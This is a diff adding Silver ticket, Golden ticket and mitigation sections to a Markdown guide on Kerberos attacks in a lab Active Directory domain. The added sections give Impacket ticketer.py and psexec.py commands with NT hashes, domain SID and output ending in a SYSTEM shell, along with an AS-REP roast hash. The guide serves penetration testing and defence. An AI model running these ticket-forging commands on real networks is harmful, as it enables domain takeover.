@@ -55,6 +55,58 @@ root@kali:impacket-examples# cat hashes.asreproast
 $krb5asrep$23$velociraptor@JURASSIC.PARK:6602e01d59b4eeba815ab467194a9de4$b13a0e139b1daa46a457b3fa948c22cbbaad75a94c2b37064d757185d171c258e290210339d950b9245de6fa40a335986146a8c71c0b60f633b4c040141460a0a91737670f21caae6261ebde0151c06adceac22bfed84cb8c1f07948fb8e75b8a1d64c768c9e3f3a50d035ec03df643ea185648406b634b6fd673028e6e90ea429f57f9229b00f47f2bba2cdb7297d29b9f97a83d07c89dee7ea673340f64c443a213d5b9bbed969a68ca7a0ea41245b0fa985f64261803488b61821fbaedf43d50ea16075b2379bb354e4001d73dfd19cc8787b4bcd2bd9b542e0e2b1218ee8c16699c134ae5ec587afe0fd1880
 ```
 
+### 4. Silver ticket
+The Silver ticket attack is based on crafting a valid TGS for a service once the NTLM hash of a user account is owned. Thus, it is possible to gain access to that service by forging a custom TGS with the maximum privileges inside it.
+
+In this case, the NTLM hash of a computer account (which is kind of a user account in AD) is owned. Hence, it is possible to craft a ticket in order to get into that machine with administrator privileges through the SMB service.
+
+It also must be taken into account that it is possible to forge tickets using the AES Kerberos keys (AES128 and AES256), which are calculated from the password as well, and can be used by Impacket and Mimikatz to craft the tickets. Moreover, these keys, unlike the NTLM hash, are salted with the domain and username.
+
+#### Linux
+```bash
+root@kali:impacket-examples# python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park  stegosaurusImpacket v0.9.18 - Copyright 2018 SecureAuth Corporation[*] Creating basic skeleton ticket and PAC Infos[*] Customizing ticket for jurassic.park/stegosaurus[*] PAC_LOGON_INFO[*] PAC_CLIENT_INFO_TYPE[*] EncTicketPart[*] EncTGSRepPart[*] Signing/Encrypting final ticket[*] PAC_SERVER_CHECKSUM[*] PAC_PRIVSVR_CHECKSUM[*] EncTicketPart[*] EncTGSRepPart[*] Saving ticket in stegosaurus.ccacheroot@kali:impacket-examples# export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache root@kali:impacket-examples# python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-passImpacket v0.9.18 - Copyright 2018 SecureAuth Corporation[*] Requesting shares on labwws02.jurassic.park.....[*] Found writable share ADMIN$[*] Uploading file JhRQHMnu.exe[*] Opening SVCManager on labwws02.jurassic.park.....[*] Creating service Drvl on labwws02.jurassic.park.....[*] Starting service Drvl.....[!] Press help for extra shell commandsMicrosoft Windows [Versión 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\Windows\system32>whoamint 
+```
+
+Execution is similar to PTT attacks, but in this case the ticket is created manually. After that, as usual, it is possible to set the ticket in the KRB5CCNAME environment variable and use it with the -no-pass -k parameters in any of the impacket examples.
+
+### 5. Golden ticket
+The Golden ticket technique is similar to the Silver ticket one, however, in this case a TGT is crafted by using the NTLM hash of the krbtgt AD account. The advantage of forging a TGT instead of TGS is being able to access any service (or machine) in the domain.
+
+The krbtgt account NTLM hash can be obtained from the lsass process or the NTDS.dit file of any DC in the domain. It is also possible to get that NTLM through a DCsync attack, which can be performed either with the [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump) module of Mimikatz or the impacket example [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py). Usually, domain admin privileges or similar are required, no matter what technique is used.
+
+#### Linux 
+The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt ntlm hash must be used:
+
+```bash
+root@kali:impacket-examples# python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurusImpacket v0.9.18 - 
+Copyright 2018 SecureAuth Corporation
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for jurassic.park/stegosaurus
+[*] PAC_LOGON_INFO[*] 
+PAC_CLIENT_INFO_TYPE[*]
+EncTicketPart[*] 
+EncAsRepPart[*] 
+Signing/Encrypting final ticket[*] 
+PAC_SERVER_CHECKSUM[*] 
+PAC_PRIVSVR_CHECKSUM[*] 
+EncTicketPart[*] 
+EncASRepPart[*] 
+Saving ticket in stegosaurus.ccacheroot@kali:impacket-examples# export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccacheroot@kali:impacket-examples# python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-passImpacket v0.9.18 - Copyright 2018 SecureAuth Corporation[*] Requesting shares on lab-wdc02.jurassic.park.....[*] Found writable share ADMIN$[*] Uploading file goPntOCB.exe[*] Opening SVCManager on lab-wdc02.jurassic.park.....[*] Creating service DMmI on lab-wdc02.jurassic.park.....[*] Starting service DMmI.....[!] Press help for extra shell commandsMicrosoft Windows [Version 6.3.9600](c) 2013 Microsoft Corporation. All rights reserved.C:\Windows\system32>whoamint authority\systemC:\Windows\system32>
+```
+### Mitigations
+In order to prevent or mitigate many of these Kerberos attacks a series of policies can be implemented. Some examples are the following:
+
+- Enable an strong password policy: First step is to avoid having weak passwords in domain user accounts. To achieve this an strong password policy should be implemented, by ensuring that complex password option is enabled on Active Directory domain. Moreover, blacklisting some common predictable terms in passwords as company names, year or months names.
+
+- Avoid accounts without pre-authentication: If it is no completely necessary, none account must have Kerberos pre-authentication enabled. In case that this cannot be avoided, take note of these special accounts and create pseudo-random passwords with high level of complexity.
+
+- Avoid executing services in behalf of account accounts: Avoid services that run in domain user account context. In case of using an special user account for launch domain services, generate an strong pseudo-random password for that account.
+
+- Verify PAC: Enable PAC verification in order to avoid attacks such as Silver Ticket. To enable this check set the value ValidateKdcPacSignature (DWORD) in subkey HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters to 1.
+
+- Disable Kerberos weak encryption types: Only Kerberos encryption with AES keys should be allowed. Furthermore, Kerberos requests with a lower level of encryption as RC4 should be monitored, due is usually used by attack tools.
+
+- Change passwords periodically: Set policies to ensure that user passwords are periodically modified, for example, each 2 to 4 months. As special case, krbtgt account password should also be changed periodically, since that key is used to create TGTs. To this purpose, the script https://gallery.technet.microsoft.com/Reset-the-krbtgt-account-581a9e51 can be used. It must be taken into account that krbtgt password must be modified twice to invalidate current domain tickets, for cache reasons. Another consideration is that the functional level of domain must be equal or higher than Windows Server 2008 in order to manipulate krbtgt account credentials.
 
 ### References
 Impacket: https://github.com/SecureAuthCorp/impacket
@@ -63,4 +115,5 @@ Mimikatz:  https://github.com/gentilkiwi/mimikatz
 
 Kerberos attacks: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast
 
+Attacking Kerberos: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
